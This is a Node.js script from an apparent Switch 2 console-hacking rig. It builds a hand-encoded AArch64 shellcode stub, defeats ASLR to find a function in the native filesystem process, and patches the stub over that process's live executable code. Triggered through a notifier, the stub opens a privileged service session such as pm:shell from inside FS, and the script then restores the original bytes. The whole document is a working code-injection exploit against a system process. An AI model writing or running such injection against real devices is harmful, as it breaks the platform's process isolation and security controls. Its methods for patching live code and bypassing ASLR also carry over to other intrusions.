'use strict';
// HIPC2 round 8 — the self-contained fs-side client.
//
// Every wedge so far = handle-space (monitor-table handles sent from the
// fs process, colliding with unrelated fs sessions). The fix: the stub
// opens its OWN session IN THE FS TABLE, using the executor's exact
// proven sequence (executor.c main()):
//   svc 0x1f ConnectToNamedPort("sm:")        -> x0=result, x1=port (fs-table!)
//   TLS frame {0x10, 0x80000000, 1} + svc 0x21(port)   = InitializeClient
//   TLS frame {0x11, 2, name@+8}   + svc 0x21(port)   = GetServiceHandle
//   reply p[3] = the service session (fs-table!), p[4] = err
// then the fs's own noarg sender (x0=proxy{0,session}, x1=out, x2=cmd)
// does the HIPC2 send + reply copy.
//
// The staged parameter block (x11 = base) keeps the stub to ~36 insns:
//   +0x00 "sm:\0..." (8B)   +0x08 proxy slot {0, handle} (8B, handle filled
//   by the stub)   +0x10 "pm:shell\0" (8B)   +0x20 sender address (8B)
//   +0x28 out area (16B)
// Clobbers ONLY caller-saved regs (x0-x2, x9-x12, x16-x17) — dispatcher-safe.
// Error paths = plain ret with w0 = the last svc result (visible in the
// probe reply; no wedge: sm and the target service always reply).
//
// Usage: node hipc2-fsclient-stub.cjs <service> <cmd>
const fsSync = require('node:fs');
const path = require('node:path');
const latest = JSON.parse(fsSync.readFileSync(path.join(__dirname, '..', '..', 'latest-session.json'), 'utf8'));
const RUN = latest.directory;
const {Client, check, read} = require(path.join(RUN, 'switch2', 'process', 'client.cjs'));

const NOARG_SENDER = 0x212ea0n;
const SENDER_PROLOGUE = '7f2303d5ff4301d1fd7b03a9f44f04a9fdc30091c90080d2';

function buildStub(stageBase, cmd) {
  // Proper AArch64 encoders — byte-verified with capstone before any live run.
  const u = v => v >>> 0;
  const movz = (imm, rd, sf) => u((sf ? 0xD2800000 : 0x52800000) | ((imm & 0xffff) << 5) | rd);
  const movk = (imm, rd, sf, hw) => u((sf ? 0xF2800000 : 0x72800000) | (hw << 21) | ((imm & 0xffff) << 5) | rd);
  const movReg = (rd, rm) => u(0xAA0003E0 | (rm << 16) | rd);        // mov Xrd, Xrm
  const svc = imm => u(0xD4000001 | (imm << 5));   // the low 5 bits = 1 (the wrapper bytes: 210400d4)
  const cbz = (rt, to, from) => u(0xB4000000 | (((to - from) & 0x7ffff) << 5) | rt);
  const cbnzW = (rt, to, from) => u(0x35000000 | (((to - from) & 0x7ffff) << 5) | rt);
  const strX = (rt, rn, off) => u(0xF9000000 | ((off / 8) << 10) | (rn << 5) | rt);
  const ldrX = (rt, rn, off) => u(0xF9400000 | ((off / 8) << 10) | (rn << 5) | rt);
  const strW = (rt, rn, off) => u(0xB9000000 | ((off / 4) << 10) | (rn << 5) | rt);
  const ldrW = (rt, rn, off) => u(0xB9400000 | ((off / 4) << 10) | (rn << 5) | rt);
  const add = (rd, rn, imm) => u(0x91000000 | (imm << 10) | (rn << 5) | rd);
  const B = Number(stageBase), C = Number(cmd) & 0xffff;
  const w = [];
  const I = 35; // the final ret's instruction index
  w.push(0xd503245f);                                            // 0  landing hint
  w.push(movz(B & 0xffff, 11, 1)); w.push(movk((B >>> 16) & 0xffff, 11, 1, 1)); // 1,2
  w.push(movk((B >>> 32) & 0xffff, 11, 1, 2)); w.push(movk((B >>> 48) & 0xffff, 11, 1, 3)); // 3,4
  w.push(movReg(1, 11));                                         // 5  mov x1, x11 ("sm:")
  w.push(svc(0x1f));                                             // 6  ConnectToNamedPort
  w.push(cbz(1, I, 7));                                          // 7  port 0 -> ret
  w.push(movReg(17, 1));                                         // 8  save the port
  w.push(u(0xD53BD069));                                         // 9  mrs x9, tpidrro_el0 (0xD53BD060|Rd, per the sender's 74d03bd5)
  w.push(movz(0x10, 10, 1)); w.push(movk(0x8000, 10, 1, 3));     // 10,11 {0x10,0x80000000}
  w.push(strX(10, 9, 0));                                        // 12 str x10, [x9]
  w.push(movz(1, 10, 1)); w.push(strX(10, 9, 8));                // 13,14 p[2]=1
  w.push(movReg(0, 17));                                         // 15 x0 = port
  w.push(svc(0x21));                                             // 16 InitializeClient
  w.push(cbnzW(0, I, 17));                                       // 17 transport err -> ret
  w.push(ldrW(10, 9, 8));                                        // 18 p[2] (result)
  w.push(cbnzW(10, I, 19));                                      // 19 err -> ret
  w.push(movz(0x11, 10, 1)); w.push(movk(2, 10, 1, 2));         // 20,21 {0x11,2}
  w.push(strX(10, 9, 0));                                        // 22
  w.push(ldrX(12, 11, 0x10));                                    // 23 the GSH name
  w.push(strX(12, 9, 8));                                        // 24 name @+8
  w.push(movReg(0, 17));                                         // 25 x0 = port
  w.push(svc(0x21));                                             // 26 GetServiceHandle
  w.push(cbnzW(0, I, 27));                                       // 27 transport err -> ret
  w.push(ldrW(12, 9, 12));                                       // 28 p[3] = the session
  w.push(strW(12, 11, 12));                                      // 29 proxy handle @stage+0xc
  w.push(add(0, 11, 8));                                         // 30 x0 = proxy
  w.push(add(1, 11, 0x28));                                      // 31 x1 = out
  w.push(movz(C, 2, 0));                                         // 32 w2 = cmd
  w.push(ldrX(16, 11, 0x20));                                    // 33 x16 = sender
  w.push(u(0xD63F0200));                                         // 34 blr x16
  w.push(0xd65f03c0);                                            // 35 ret
  if (w.length !== 36) throw Error('stub layout drift: ' + w.length);
  const buf = Buffer.alloc(w.length * 4);
  w.forEach((word, i) => buf.writeUInt32LE(word, i * 4));
  const blocks = [];
  for (let i = 0; i < buf.length; i += 16) blocks.push(buf.subarray(i, i + 16));
  return {blocks, hex: buf.toString('hex')};
}

async function main() {
  const service = process.argv[2] ?? 'pm:shell';
  const cmd = Number(process.argv[3] ?? 6);
  check(/^[a-z0-9:-]{1,8}$/.test(service), 'Service name must be <= 8 chars');
  check(Number.isInteger(cmd) && cmd >= 0 && cmd <= 0xffff, 'Bad cmd');

  const c = await new Client().open(), m = c.memory;
  const log = o => console.log(JSON.stringify(o));
  await log({stage: 'open', session: m.info.session});

  const fsHandle = await c.fsProcess();
  const identity = await c.info(fsHandle);
  check(!identity.result && identity.programId === '0400000000000000', 'Target is not native FS');
  const pid = identity.pid;

  // ASLR relocation: the live text region from the vtable target.
  const notifier = await read(path.join(RUN, 'switch2', 'ro', m.info.session + '-notifier-proof.json'));
  const table = await m.pointer(notifier.E);
  const target0 = BigInt(await m.pointer(table + 4 * 8));
  const region = await c.info(fsHandle, target0, pid);
  check(!region.result && region.memory?.type === 3 && region.memory?.permissions === 4,
    'The vtable target is not in X-only fs text');
  const senderAddr = BigInt(region.memory.address) + NOARG_SENDER;
  const senderRead = await c.read(fsHandle, pid, senderAddr, 0x1c);
  check(!senderRead.result && senderRead.hex.startsWith(SENDER_PROLOGUE), 'Live sender prologue differs: ' + senderRead.hex);
  await log({stage: 'sender-verified', sender: senderAddr.toString()});

  // The notifier stub site.
  const state = await m.request({command: 'root-native-info'});
  const notifierHandle = state.notifiers[0];
  check(notifierHandle && state.worker.joined, 'Notifier or worker state missing');
  const targetAddr = target0;
  const {blocks, hex} = buildStub(0, cmd);                    // pass 0: measure first
  check(blocks.length * 16 <= 160, 'Stub too large');
  const stubLen = hex.length / 2;
  check((targetAddr & 0xfffn) + BigInt(stubLen) <= 0x1000n, 'The stub would cross a page');

  // The rig read op caps at 128 bytes — read the 144-byte site in two parts.
  const readSite = async len => {
    let hex = '';
    for (let off = 0; off < len; off += 128) {
      const n = Math.min(128, len - off);
      const r = await c.read(fsHandle, pid, targetAddr + BigInt(off), n);
      check(!r.result, 'The stub-site read failed at +' + off);
      hex += r.hex;
    }
    return hex;
  };
  const origHex = await readSite(stubLen);
  const origBlocks = [];
  for (let i = 0; i < stubLen; i += 16)
    origBlocks.push(Buffer.from(origHex.slice(i * 2, (i + 16) * 2), 'hex'));

  // Stage the parameter block.
  const stage = Buffer.alloc(0x40);
  stage.write('sm:\0', 0);
  stage.write(service + '\0', 0x10);
  stage.writeBigUInt64LE(BigInt(senderAddr), 0x20);
  const staged = await m.request({command: 'root-hipc2-stage', hex: stage.toString('hex')});
  const stageBase = BigInt(staged.address);
  await log({stage: 'staged', base: staged.address});

  const {blocks: stubBlocks} = buildStub(stageBase, cmd);
  const installed = [];
  let trigger = null, triggerError = null;
  try {
    for (let i = 0; i < stubBlocks.length; i++) {
      const reply = await c.patch(fsHandle, pid, targetAddr + 16n * BigInt(i), origBlocks[i], stubBlocks[i]);
      check(!reply.result && reply.expectedMatched && reply.readbackMatched, 'Patch install failed at block ' + i);
      installed.push(i);
    }
    await log({stage: 'installed', blocks: installed.length});
    try { trigger = await c.worker({kind: 'notifier-probe', handle: notifierHandle}); }
    catch (e) { triggerError = e; }
    const fetched = await m.request({command: 'root-hipc2-fetch', address: Number(stageBase), length: 0x40});
    await log({stage: 'trigger',
      result: trigger ? trigger.result : null,
      transport: trigger?.transport ?? null,
      triggerError: triggerError ? String(triggerError.message).slice(0, 120) : null,
      stageHex: fetched.hex});
    // Parse: the proxy slot +4 = the opened session; the out area @+0x28 = the reply.
    const raw = Buffer.from(fetched.hex, 'hex');
    const session = raw.readUInt32LE(0xc);
    const senderResult = trigger ? trigger.result : null;
    await log({stage: 'parsed', session, senderResult,
      outHex: raw.subarray(0x28, 0x38).toString('hex')});
  } finally {
    for (const i of installed.reverse()) {
      const reply = await c.patch(fsHandle, pid, targetAddr + 16n * BigInt(i), stubBlocks[i], origBlocks[i]);
      check(!reply.result && reply.readbackMatched, 'RESTORE FAILED at block ' + i);
    }
    const backHex = await readSite(stubLen);
    await log({stage: 'restored', ok: backHex === origHex});
    check(backHex === origHex, 'Restored bytes differ');
  }
  await c.close();
  console.log(JSON.stringify({done: true, service, cmd, session: m.info.session}));
}

main().catch(e => { console.error(JSON.stringify({error: String(e.message).slice(0, 200)})); process.exitCode = 1; });
